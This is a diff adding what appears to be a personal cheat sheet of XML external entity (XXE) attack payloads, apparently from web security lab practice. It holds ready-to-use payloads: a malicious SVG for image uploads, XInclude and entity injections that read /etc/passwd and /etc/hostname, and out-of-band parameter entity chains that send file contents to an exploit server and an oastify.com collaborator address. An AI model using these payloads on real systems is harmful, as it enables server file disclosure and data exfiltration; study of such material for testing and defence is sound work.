@@ -1,0 +1,51 @@
+Don't confuse paramter entities with external entities
+
+XXE via IMAGE UPLOAD
+> Identify upload image functionality
+> Generate svg with malicious xxe
+
+Broken down
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+
+Single line
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+REPLACE XML VALUE TO RETRIVE FILES
+> Identify request using xml
+> Replace value with following:
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+> Response will show contents of file
+> Ensure all values are replaced
+
+INJECTING ENTITIES
+<?xml version="1.0" encoding="UTF-8"?>
+INSERT -> <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+    <productId>
+        1 INSERT -> &xxe;
+    </productId>
+    <storeId>
+        1
+    </storeId>
+</stockCheck>
+
+PARAMETER ENTITIES - OOB INTERACTION
+> Insert under xml declaration
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+
+> Try chain with exploit server
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://exploit_server"> %xxe; ]>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+> Alternative but similar
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://exploit_server"> %xxe; ]>
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://o9yew39js30bfzheu0nwq2o3quwlko8d.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
